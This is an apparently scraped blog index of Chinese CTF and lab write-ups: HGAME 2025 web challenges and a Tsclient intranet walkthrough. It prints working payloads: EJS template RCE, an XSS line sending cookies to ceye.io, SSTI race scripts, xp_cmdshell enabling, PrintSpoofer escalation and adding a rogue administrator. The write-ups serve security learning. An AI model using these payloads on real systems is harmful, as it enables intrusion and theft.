alt=\"image-20250306185409381\" loading=\"lazy\" src=\"../assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先用vshell上线\u003c/p\u003e\n\u003cp\u003e读flag需要提权\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"春秋云镜-Initial-Writeup"},{"content":"Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n感觉是栅栏，解密拿到flag\nLevel 47 BandBomb 文件上传\n附件有源码\n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;无效的文件名\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;文件处理错误\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;没有选择文件\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;文件上传成功\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`服务器运行在 http://localhost:${port}`); 89}); 这题有点像24国赛的ezjs\n文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区\n可以看到在 /rename 路由\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); 这个路由会将uploads目录中的文件重命名\n我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名\n也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 将ejs上传\n覆写原来的ejs\n访问/\n这题flag藏在环境变量里\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard 密码爆破，XSS cookie窃取\n爆出来 shallot/888888\n登进去看到一个留言板\n猜测是xss，测试一下\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 同时通过dirsearch扫到了/admin路由\n根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板\n也就是说我们可以进行cookie窃取\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; 将payload输出在留言板，然后访问/admin\n成功拿到admin的cookie\n拿admin的cookie访问/flag即可拿到flag\nLevel 25 双面人派对 这道题有两个环境，一开始以为是re，其实感觉更像是misc\n访问app.service-web可以拿到一个main文件\n是一个elf文件\n用exeinfo PE查到用upx加壳了\n用upx官方工具就可以脱壳\nhttps://github.com/upx/upx/releases/latest\n脱壳之后用ida打开\n可以找到一段关于minio的密钥信息\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; 那我们大概就能猜到另一个环境应该就是这个minio的服务\n用mc通过Access Key和Secret Key连接上去\n里面有两个储存桶\n将两个储存桶都下载下来\n/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新\n看一下源码\n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} 我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录\n我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } 这里我将/路由改成了/abc，因为不知道为啥我用/路由不行\n将源码编译后覆写到储存桶上\n访问/abc\n拿到flag\nLevel 38475 角落 ssti/条件竞争\n/robots.txt有个/app.conf\n访问/app.conf\n这里展示了httpd.conf的片段\n这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露\n同时在响应标头能找到Apache的版本信息\n可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关\nCVE-2024-38475\n网上没找到什么poc\n但是可以找到漏洞发现者的一篇文章\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\n根据这篇文章我们可以构造出paylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F 这道题多了一个RewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;，只需要在user-agent前面加上L1nk/即可\n拿到源码\n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) 可以看到/read路由存在ssti，但是他waf掉了最重要的{\n但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了\n接下来就是搓脚本发包\n三个脚本\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break 成功执行，拿到flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003e拿到环境\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一个小游戏，猜测应该是js审计\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看index.js发现代码进行了混淆\u003c/p\u003e\n\u003cp\u003e可以用工具反混淆一下，增加一下可读性\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反混淆之后找到这个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"关于"},{"content":"Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n参考文章\n春秋云镜 TSclient \u0026ndash; Walkthrough - KingBridge - 博客园\n春秋云境 Tsclient | 初零·b10g~🥝\nFLAG1 先用fscan扫一下\nmssql服务是弱口令\nsa/1qaz!QAZ 用数据库管理工具连上去\n接下来要看mssql怎么进行命令执行\n参考文章：\nhttps://xz.aliyun.com/news/7129\n判断xp_cmdshell状态\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; 存在\n那我们接下来启动它\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; 配置选项 \u0026#39;xp_cmdshell\u0026#39; 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。 启动成功\n接下来就可以进行命令执行了\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; 接下来直接vshell一句话上线\n没找到flag，发现Administrator文件夹没有权限\n想到要提权，传一个PrintSpoofer进行提权\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd 提权之后拿到flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... 提权之后用提权后的账户重新上一下线\n接下来用fscan扫一下内网\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] 暴力破解线程数: 1 11[2025-03-09 19:53:19] [INFO] 开始信息扫描 12[2025-03-09 19:53:19] [INFO] CIDR范围: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] 生成IP范围: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] 解析CIDR 172.22.8.0/24 -\u0026gt; IP范围 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] 最终有效主机数量: 256 16[2025-03-09 19:53:20] [INFO] 开始主机扫描 17[2025-03-09 19:53:20] [INFO] 正在尝试无监听ICMP探测... 18[2025-03-09 19:53:20] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-03-09 19:53:20] [INFO] 切换为PING方式探测... 20[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.31 存活 (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.18 存活 (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.15 存活 (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.46 存活 (ICMP) 24[2025-03-09 19:53:23] [INFO] 存活主机数量: 4 25[2025-03-09 19:53:23] [INFO] 有效端口数量: 233 26[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] 端口开放 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] 服务识别 172.22.8.18:1433 =\u0026gt; [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] 服务识别 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] 存活端口数量: 17 61[2025-03-09 19:54:30] [INFO] 开始漏洞扫描 62[2025-03-09 19:54:30] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 64目标主机: 172.22.8.18 65主机名: WIN-WEB 66发现的网络接口: 67 IPv4地址: 68 └─ 172.22.8.18 69 IPv6地址: 70 └─ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 73目标主机: 172.22.8.15 74主机名: DC01 75发现的网络接口: 76 IPv4地址: 77 └─ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 79目标主机: 172.22.8.46 80主机名: WIN2016 81发现的网络接口: 82 IPv4地址: 83 └─ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.8.31 86主机名: WIN19-CLIENT 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.18 状态码:200 长度:703 标题:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] 扫描已完成: 32/32 扫到三台机子\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 没有什么能直接利用的服务\n那我们接着信息收集一下\nnet user 主机名: WIN-WEB\rOS 名称: Microsoft Windows Server 2016 Datacenter\rOS 版本: 10.0.14393 暂缺 Build 14393\rOS 制造商: Microsoft Corporation\rOS 配置: 独立服务器\rOS 构件类型: Multiprocessor Free\r注册的所有人:\r注册的组织: Aliyun\r产品 ID: 00376-40000-00000-AA947\r初始安装日期: 2022/7/11, 12:46:14\r系统启动时间: 2025/3/9, 18:28:29\r系统制造商: Alibaba Cloud\r系统型号: Alibaba Cloud ECS\r系统类型: x64-based PC\r处理器: 安装了 1 个处理器。\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS 版本: SeaBIOS 449e491, 2014/4/1\rWindows 目录: C:\\Windows\r系统目录: C:\\Windows\\system32\r启动设备: \\Device\\HarddiskVolume1\r系统区域设置: zh-cn;中文(中国)\r输入法区域设置: zh-cn;中文(中国)\r时区: (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐\r物理内存总量: 3,950 MB\r可用的物理内存: 883 MB\r虚拟内存: 最大值: 5,848 MB\r虚拟内存: 可用: 1,169 MB\r虚拟内存: 使用中: 4,679 MB\r页面文件位置: C:\\pagefile.sys\r域: WORKGROUP\r登录服务器: 暂缺\r修补程序: 安装了 6 个修补程序。\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\r网卡: 安装了 1 个 NIC。\r[01]: Red Hat VirtIO Ethernet Adapter\r连接名: 以太网\r启用 DHCP: 是\rDHCP 服务器: 172.22.255.253\rIP 地址\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 C:\\Tmp\u0026gt;net user\r\\\\ 的用户帐户\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\r命令运行完毕，但发生一个或多个错误。 C:\\Tmp\u0026gt;quser\r用户名 会话名 ID 状态 空闲时间 登录时间\rjohn rdp-tcp#0 2 运行中 2:38 2025/3/9 18:30 发现一个john用户远程连接本台机子\n为了方便可以新建一个用户rdp连上去\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\r命令成功完成。\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\r命令成功完成。\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; 